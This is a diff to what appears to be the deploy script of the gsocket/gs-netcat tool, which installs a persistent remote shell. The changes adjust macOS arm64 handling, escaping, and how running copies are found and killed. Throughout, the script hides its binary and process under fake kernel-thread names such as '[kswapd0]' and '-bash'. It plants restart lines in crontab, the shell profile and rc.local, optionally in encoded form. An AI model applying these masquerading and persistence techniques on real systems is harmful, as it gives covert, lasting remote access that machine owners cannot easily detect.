@@ -144,7 +144,7 @@ proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm
 # Pick a process name at random
 PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
 for str in "${proc_name_arr[@]}"; do
-	PROC_HIDDEN_NAME_RX+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
+	PROC_HIDDEN_NAME_RX+="|$(echo "$str" | sed 's/[^a-zA-Z0-9_-]/\\&/g')"
 done
 PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
 
@@ -527,7 +527,7 @@ try_dstdir()
 	# Find an executeable and test if we can execute binaries from
 	# destination directory (no noexec flag)
 	# /bin/true might be a symlink to /usr/bin/true
-	for ebin in "/bin/true" "$(command -v id)"; do
+	for ebin in "/bin/true" "/usr/bin/true" "$(command -v id)"; do
 		[[ -z $ebin ]] && continue
 		[[ -e "$ebin" ]] && break
 	done
@@ -725,10 +725,8 @@ init_vars()
 			fi
 		elif [[ $OSTYPE == *darwin* ]]; then
 			if [[ "$arch" == "arm64" ]]; then
-				OSARCH="x86_64-osx" # M1
-				## FIXME: really needs M3 here..
+				OSARCH="arm64-osx" # M1
 				SRC_PKG="gs-netcat_mini-macOS-arm64"
-				# OSARCH="arm64-osx" # M1
 			else
 				OSARCH="x86_64-osx"
 				SRC_PKG="gs-netcat_mini-macOS-x86_64"
@@ -763,19 +761,41 @@ init_vars()
 	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
 	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_mini-${OSARCH}.tar.gz"
 
-	# OSX's pkill matches the hidden name and not the original binary name.
-	# Because we hide as '-bash' we can not use pkill all -bash.
-	# 'killall' however matches gs-dbus and on OSX we thus force killall
+	# Defaults
+	# Binary file is called gs-dbus or set to same name as Process name if
+	# GS_NAME is set. Can be overwritten with GS_BIN=
+	if [[ -n $GS_BIN ]]; then
+		BIN_HIDDEN_NAME="${GS_BIN}"
+		BIN_HIDDEN_NAME_RM+=("$GS_BIN")
+	else
+		BIN_HIDDEN_NAME="${GS_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
+	fi
+	BIN_HIDDEN_NAME_RX=$(echo "$BIN_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')
+	
+	if [[ -n $GS_NAME ]]; then
+		PROC_HIDDEN_NAME="${GS_NAME}"
+		PROC_HIDDEN_NAME_RX+="|$(echo "$GS_NAME" | sed 's/[^a-zA-Z0-9_-]/\\&/g')"
+	else
+		PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
+	fi
+
+	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"
+
 	if [[ $OSTYPE == *darwin* ]]; then
-		# on OSX 'pkill' matches the process (argv[0]) whereas on Unix
-		# 'pkill' matches the binary name.
+		# on OSX 'pkill' and 'killall' match the process (argv[0]) whereas on Unix
+		# they match the binary name.
+		WARN "OSX is least supported. GS_UNDO= may not work. Check manually"
 		KL_CMD="killall"
+		IS_KILL_ON_ARGV0=1
+		KL_NAME="${PROC_HIDDEN_NAME}"
 		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
 	elif command -v pkill >/dev/null; then
 		KL_CMD="pkill"
+		KL_NAME="${BIN_HIDDEN_NAME_RX}"
 		KL_CMD_RUNCHK_UARG=("-0" "-U${UID}")
 	elif command -v killall >/dev/null; then
 		KL_CMD="killall"
+		KL_NAME="${BIN_HIDDEN_NAME}"
 		# cygwin's killall needs the name (not the uid)
 		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
 	fi
@@ -791,26 +811,6 @@ init_vars()
 		[[ -z $KL_CMD_BIN ]] && KL_CMD_BIN="/bin/does-not-exit"
 		WARN "No pkill or killall found."
 	}
-
-	# Defaults
-	# Binary file is called gs-dbus or set to same name as Process name if
-	# GS_NAME is set. Can be overwritten with GS_BIN=
-	if [[ -n $GS_BIN ]]; then
-		BIN_HIDDEN_NAME="${GS_BIN}"
-		BIN_HIDDEN_NAME_RM+=("$GS_BIN")
-	else
-		BIN_HIDDEN_NAME="${GS_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
-	fi
-	BIN_HIDDEN_NAME_RX=$(echo "$BIN_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')
-	
-	if [[ -n $GS_NAME ]]; then
-		PROC_HIDDEN_NAME="${GS_NAME}"
-		PROC_HIDDEN_NAME_RX+="|$(echo "$GS_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')"
-	else
-		PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
-	fi
-
-	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"
 
 	RCLOCAL_DIR="${GS_PREFIX}/etc"
 	RCLOCAL_FILE="${RCLOCAL_DIR}/rc.local"
@@ -936,8 +936,8 @@ init_setup()
 	# The best we can do:
 	# 1. Try pkill/killall _AND_ daemon is running then do nothing.
 	# 2. Otherwise start gs-dbus as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
-	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || '${DSTBIN}' 2>/dev/null"
-	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || '${DSTBIN}' 2>/dev/null"
+	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} '${KL_NAME}' 2>/dev/null || '${DSTBIN}' 2>/dev/null"
+	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} '${KL_NAME}' 2>/dev/null || '${DSTBIN}' 2>/dev/null"
 
 	if [[ -n $ENCODE_STR ]]; then
 		RCLOCAL_LINE="$(mk_encode "$RCLOCAL_LINE")"
@@ -1106,9 +1106,13 @@ uninstall()
 	[[ -n "$systemd_kill_cmd" ]] && systemctl daemon-reload 2>/dev/null
 
 	echo -en "--> Use ${CM}"
-	for x in "${cmd_kill_arr[@]}"; do
-		echo -n "${KL_CMD:-pkill} $x;"
-	done
+	if [[ -n $IS_KILL_ON_ARGV0 ]]; then
+		echo -n "pkill -x '(${PROC_HIDDEN_NAME_RX})';"
+	else
+		for x in "${cmd_kill_arr[@]}"; do
+			echo -n "${KL_CMD:-pkill} '$x';"
+		done
+	fi
 	echo -e "${systemd_kill_cmd}${CN} to terminate all running shells."
 	exit_code 0
 }
@@ -1533,9 +1537,7 @@ install_user_profile()
 install_user()
 {
 	# Use crontab if it's not in systemd (but might be in rc.local).
-	if [[ ! $OSTYPE == *darwin* ]]; then
-		install_user_crontab
-	fi
+	[[ $OSTYPE != *darwin* ]] && install_user_crontab
 
 	[[ $IS_INSTALLED -lt 2 ]] && {
 		# install_user_profile
@@ -1900,7 +1902,7 @@ gs_start()
 	# ./deploy.sh -> re-installs new secret. Start gs-dbus with _new_ secret.
 	# Now two gs-dbus's are running (which is correct)
 	if [[ -n "$KL_CMD" ]]; then
-		${KL_CMD} "${KL_CMD_RUNCHK_UARG[@]}" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
+		${KL_CMD} "${KL_CMD_RUNCHK_UARG[@]}" "${KL_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
 	elif command -v pidof >/dev/null; then
 		# if no pkill/killall then try pidof (but we cant tell which user...)
 		if pidof -qs "$BIN_HIDDEN_NAME" &>/dev/null; then
